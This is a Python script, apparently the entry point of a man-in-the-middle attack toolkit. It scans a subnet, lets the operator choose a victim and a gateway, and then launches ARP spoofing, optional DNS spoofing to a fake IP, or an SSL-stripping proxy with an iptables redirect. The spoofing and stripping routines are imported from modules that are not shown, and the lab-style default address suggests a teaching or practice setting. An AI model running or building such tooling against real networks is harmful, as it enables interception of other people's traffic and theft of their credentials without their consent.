from network_utils import scan_network, get_attacker_ip, get_attacker_mac
from attacks.arp_spoof import start_arp_spoofing, restore_arp
from attacks.dns_spoof import start_dns_spoofer
from attacks.ssl_strip import start_ssl_strip_proxy
from scapy.arch import get_if_list
import threading
import signal
import sys


def print_banner():
    print("=" * 40)
    print("        MITM Attack Launcher")
    print("=" * 40)


def choose_from_list(prompt, items):
    print("\n{}".format(prompt))
    for i, item in enumerate(items):
        print("{}: {}".format(i, item))
    while True:
        try:
            idx = int(input("Enter your choice: "))
            if 0 <= idx < len(items):
                return items[idx]
        except ValueError:
            pass
        print("Invalid input. Please try again.")


def choose_interface():
    interfaces = get_if_list()
    return choose_from_list("Available Network Interfaces:", interfaces)


def choose_host(hosts, role):
    print("\nAvailable devices on the network:")
    for i, (ip, mac) in enumerate(hosts):
        print("{}: {} ({})".format(i, ip, mac))
    while True:
        try:
            idx = int(input("Select {} index: ".format(role)))
            if 0 <= idx < len(hosts):
                return hosts[idx]
        except ValueError:
            pass
        print("Invalid selection, try again.")


def run_arp_dns_attack():
    iface = choose_interface()
    attacker_ip = get_attacker_ip(iface)
    attacker_mac = get_attacker_mac(iface)
    subnet = ".".join(attacker_ip.split(".")[:-1]) + ".0/24"

    print("\n[*] Scanning network on {}...".format(subnet))
    hosts = scan_network(subnet, iface=iface)
    if len(hosts) < 2:
        print("[-] Not enough devices found to perform attack.")
        sys.exit(1)

    victim_ip, victim_mac = choose_host(hosts, "victim")
    gateway_ip, gateway_mac = choose_host(hosts, "gateway")

    dns_input = input("\nEnable DNS spoofing? (y/n) [n]: ").strip().lower()
    enable_dns = dns_input == 'y'

    fake_ip = "192.168.56.102"
    if enable_dns:
        fake_ip_input = input("Enter fake IP [default: {}]: ".format(fake_ip)).strip()
        if fake_ip_input:
            fake_ip = fake_ip_input

    stop_event = threading.Event()
    print("\n[*] Launching ARP spoofing...")
    arp_thread = threading.Thread(
        target=start_arp_spoofing,
        args=(victim_ip, victim_mac, gateway_ip, gateway_mac, attacker_mac, iface, stop_event),
        daemon=True
    )
    arp_thread.start()

    try:
        if enable_dns:
            print("[*] Starting DNS spoofing...")
            start_dns_spoofer(fake_ip=fake_ip, iface=iface)
        else:
            print("[*] ARP spoofing is running. Press Ctrl+C to stop...")
            while True:
                signal.pause()

    except KeyboardInterrupt:
        print("\n[!] Interrupted. Stopping attack...")

    finally:
        print("[*] Restoring ARP tables...")
        stop_event.set()
        arp_thread.join()
        print("[+] Cleanup complete.")


def run_ssl_stripping():
    print("\n[*] Starting SSL Stripping proxy...")
    port_input = input("Enter local port [default: 8080]: ").strip()
    if port_input:
        port = int(port_input)
    else:
        port = 8080

    ipt_input = input("Add iptables redirect? (y/n) [n]: ").strip().lower()
    use_iptables = ipt_input == 'y'
    start_ssl_strip_proxy(port, use_iptables)


def main():
    print_banner()

    while True:
        print("\n1. ARP Spoofing (optional DNS spoofing)")
        print("2. SSL Stripping proxy")
        print("0. Exit")

        try:
            choice_input = input("Choose attack mode [0-2]: ").strip()
            choice = int(choice_input)
        except ValueError:
            print("Invalid input. Please enter a number.")
            continue

        if choice == 1:
            run_arp_dns_attack()
        elif choice == 2:
            run_ssl_stripping()
        elif choice == 0:
            print("Exiting.")
            sys.exit(0)
        else:
            print("Invalid selection. Try again.")


if __name__ == "__main__":
    main()
